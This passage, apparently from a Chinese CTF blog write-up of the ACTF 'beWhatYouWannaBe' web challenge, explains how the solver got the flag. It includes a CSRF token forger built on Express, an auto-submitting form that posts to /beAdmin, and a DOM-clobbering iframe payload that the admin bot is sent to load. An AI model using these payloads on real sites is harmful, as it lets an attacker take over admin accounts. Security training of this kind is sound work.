class="variable constant_">FLAG</span>)</span><br><span class="line">    <span class="keyword">await</span> browser.<span class="title function_">close</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">view</span> = view</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">FLAG</span> = <span class="string">&quot;ACTF&#123;*****************************&#125;&quot;</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FAKE_FLAG</span> = <span class="string">&quot;only_admin_users_can_see_the_true_flag&quot;</span></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">FLAG</span> = <span class="variable constant_">FLAG</span></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">FAKE_FLAG</span> = <span class="variable constant_">FAKE_FLAG</span></span><br></pre></td></tr></table></figure>
<p>其实这一题不难，思路很清晰，前半段flag在&#x2F;flag路由，首先你得是管理员，并且题目为我们提供了一个&#x2F;beAdmin成为管理员的接口和一个可以进行CSRF的&#x2F;admin接口，因此思路是利用CSRF先成为admin获取前半段flag<br>至于后半段flag，假如admin跳转过后的页面通过dom获取的<code>fff.lll.aaa.ggg.value == &quot;this_is_what_i_want&quot;</code>那么就可以获取后半段flag<br>因此先解决前半段的问题，想要进行csrf还有一个问题就是token，仔细看这个token：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678259102832-30a2657d-9a2d-4077-92c7-13875b29e134.png#averageHue=%23252825&clientId=u598b123f-9b07-4&from=paste&height=118&id=u610e3406&name=image.png&originHeight=147&originWidth=1248&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=261221&status=done&style=none&taskId=u0f20c037-c7a6-46d8-ad9f-49dadcf704e&title=&width=998.4" alt="image.png"><br>他是利用当前的date生成的，因此完全是可以自己伪造的，首先起一个恶意的express服务器，用于进行CSRF：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app= <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> sha256 = crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;sha256&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> time = <span class="title class_">Date</span>.<span class="title function_">now</span>()-<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">var</span> time2 = <span class="title class_">Math</span>.<span class="title function_">floor</span>(time / <span class="number">1000</span>)-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> time3 = <span class="title class_">Math</span>.<span class="title function_">sin</span>(time2).<span class="title function_">toString</span>()</span><br><span class="line">    <span class="keyword">var</span> token = sha256.<span class="title function_">update</span>(time3).<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`time:<span class="subst">$&#123;time&#125;</span>`</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`time2:<span class="subst">$&#123;time2&#125;</span>`</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`time3:<span class="subst">$&#123;time3&#125;</span>`</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`token:<span class="subst">$&#123;token&#125;</span>`</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;-------------&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(token);</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;test&#x27;</span>, &#123; <span class="attr">name</span>:  token   &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8083</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server is running at http://localhost:8083&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//1678261827129</span></span><br><span class="line"><span class="comment">//1678261827131</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">  &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  window.onload=function()&#123;</span><br><span class="line">    document.getElementById(&quot;postsubmit&quot;).click();</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;http://localhost:8000/beAdmin&quot;&gt;</span><br><span class="line">  &lt;input id=&quot;u&quot; type=&quot;text&quot; name=&quot;csrftoken&quot; value=&quot;&lt;%=name%&gt;&quot;&gt;</span><br><span class="line">  &lt;input id=&quot;m&quot; type=&quot;text&quot; name=&quot;username&quot; value=&quot;kino&quot;&gt;</span><br><span class="line">  &lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678265396020-cb39818a-ff8f-47af-9372-6b47fd321d81.png#averageHue=%23b5b5b5&clientId=u9558d3ae-ed95-4&from=paste&height=124&id=udf1edb8e&name=image.png&originHeight=155&originWidth=961&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6466&status=done&style=none&taskId=ue12b867c-39af-469f-9cf0-883934c0b96&title=&width=768.8" alt="image.png"><br>获得第一个flag，这里获得第一个flag的时候需要注意那个token生成的时间差，需要自己debug，这一点巨恶心<br>然后第二个flag直接利用dom破坏：<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/131314826">https://zhuanlan.zhihu.com/p/131314826</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">fff</span> <span class="attr">srcdoc</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">&lt;iframe srcdoc=&#x27;&lt;input id=aaa name=ggg href=cid:Clobbered value=this_is_what_i_want&gt;test&lt;/input&gt;&lt;a id=aaa&gt;&#x27; name=lll&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="keyword">@import</span> <span class="string">&#x27;//portswigger.net&#x27;</span>;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在自己vps上放这个文件，然后让admin访问就好了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678266086476-c37b95bf-a2e4-43cb-980c-fe7ecee36a8f.png#averageHue=%23161413&clientId=u9558d3ae-ed95-4&from=paste&height=166&id=udf290b41&name=image.png&originHeight=207&originWidth=1188&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=20762&status=done&style=none&taskId=u282788d4-9c9e-4bfe-bd47-7df683124fc&title=&width=950.4" alt="image.png"></p>
<p>参考：<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html">https://www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html</a><br><a target="_blank" rel="noopener" href="https://github.com/l3s10n/My-CTF-Challenges-In-ACTF2022/blob/main/writeup/ToLeSion_zh.md">https://github.com/l3s10n/My-CTF-Challenges-In-ACTF2022/blob/main/writeup/ToLeSion_zh.md</a><br><a target="_blank" rel="noopener" href="https://blog.rois.io/2022/actf2022-writeup/">https://blog.rois.io/2022/actf2022-writeup/</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/131314826">https://zhuanlan.zhihu.com/p/131314826</a><br><a target="_blank" rel="noopener" href="http://www.yongsheng.site/2022/06/30/AAActf/">http://www.yongsheng.site/2022/06/30/AAActf/</a><br><a target="_blank" rel="noopener" href="https://igml.top/2022/02/20/TQLCTF2022/">https://igml.top/2022/02/20/TQLCTF2022/</a><br><a target="_blank" rel="noopener" href="https://ek1ng.com/ACTF2022.html#beWhatYouWannaBe">https://ek1ng.com/ACTF2022.html#beWhatYouWannaBe</a></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/ACTF/" class="tag">#ACTF</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/04/02/VNCTF2023/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">VNCTF2023-WriteUp</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/04/02/2022%E4%B8%9C%E5%8D%8E%E6%9D%AF%20_%20Userconsole/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">2022东华杯 Userconsole</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>